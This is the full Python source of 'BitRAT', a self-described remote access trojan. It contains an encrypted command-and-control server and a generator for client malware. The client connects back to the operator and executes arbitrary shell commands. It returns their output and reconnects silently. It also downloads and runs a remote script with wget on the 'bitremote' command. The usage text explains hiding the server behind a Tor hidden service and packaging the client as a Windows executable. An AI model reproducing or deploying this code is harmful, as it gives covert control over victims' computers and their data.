#!/usr/bin/env python
# -*- coding: utf-8 -*-
import readline, socket, sys, time, os, binascii
from Crypto import Random
from Crypto.Cipher import AES
def logo():
    if os.name =="nt": 
        os.system("cls")
    else: 
        os.system("clear")
    print '''
  ___ _ _   ___    _ _____ 
 | _ |_) |_| _ \  /_\_   _|
 | _ \ |  _|   / / _ \| |  
 |___/_|\__|_|_\/_/ \_\_|  
 Basic Micro RAT 
    '''
try:
    PORT = int(sys.argv[1])
    HOST = str(sys.argv[2])
    GEN = str(sys.argv[3])
    if GEN == 'gen':
        PORT = str(sys.argv[1])
        HOST = str(sys.argv[2])
        N_K=(binascii.hexlify(os.urandom(16)))
        print '''import os,socket,sys,time
from Crypto import Random
from Crypto.Cipher import AES
H='{}'
P={}
K ='{}'
def pad(s):
 return s+b"\\0"*(AES.block_size-len(s)%AES.block_size)
def encrypt(plaintext):
 plaintext=pad(plaintext)
 iv=Random.new().read(AES.block_size)
 cipher=AES.new(K,AES.MODE_CBC,iv)
 return iv+cipher.encrypt(plaintext)
def decrypt(ciphertext):
 iv=ciphertext[:AES.block_size]
 cipher=AES.new(K,AES.MODE_CBC,iv)
 plaintext=cipher.decrypt(ciphertext[AES.block_size:])
 return plaintext.rstrip(b'\\0')
def main():
 try:
  s=socket.socket()
  s.connect((H,P))
  while True:
   data=s.recv(1024)
   cmd=decrypt(data)
   if cmd=='bitremote':
     os.system('wget https://raw.githubusercontent.com/X1pe0/bitrat/main/tools/remc.py')
     os.system('nohup python3 remc.py %s 6969 1000 600 &'%(H))
   if cmd=='bitclose':
     os.system('killall python')
   results=os.popen(cmd).read()
   s.sendall(encrypt(results))
 except:
  time.sleep(5)
  main()
if __name__=='__main__':
 main()
'''.format(HOST,PORT, N_K)
except:
    logo()  
    print 'Usage: ./bitrat.py <port> <host> <key>'
    print "'./bitrat.py <port> <host> gen > example.py' to generate client."
    print ""
    print "               ----How to use Tor----"
    print ""
    print "To use TOR, add the lines below to -> '/etc/tor/torrc'"
    print "HiddenServiceDir /root/brat/"
    print "HiddenServicePort 80 127.0.0.1:5000"
    print "Generate a client with the onion address shown in '/root/brat/hostname'"
    print "Add the imports to the header of the client 'from torrequest import TorRequest'"
    print ""
    print "                ----Windows Hosts----"
    print ""
    print "To compile for a windows host. Use pyinstaller on the generated client."
    print "Ex: './bitrat.py <port> <host> gen > example.py | pyinstaller ./example.py'"
    sys.exit(1)
if GEN == 'gen':
    exit()
KEY = GEN
def pad(s):
    return s + b'\0' * (AES.block_size - len(s) % AES.block_size)
def encrypt(plaintext):
    plaintext = pad(plaintext)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(plaintext)
def decrypt(ciphertext):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b'\0')
def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, int(PORT)))
    s.listen(10)
    print 'Waiting for connection on %s:%s'%(HOST,PORT)
    print 'KEY: %s'%(KEY)
    print ''
    conn, _ = s.accept()
    while True:
        cmd = raw_input('# -> ').rstrip()
        if cmd == '':
            continue
        conn.send(encrypt(cmd))
        data = conn.recv(4096)
        print decrypt(data)
if __name__ == '__main__':
    main()
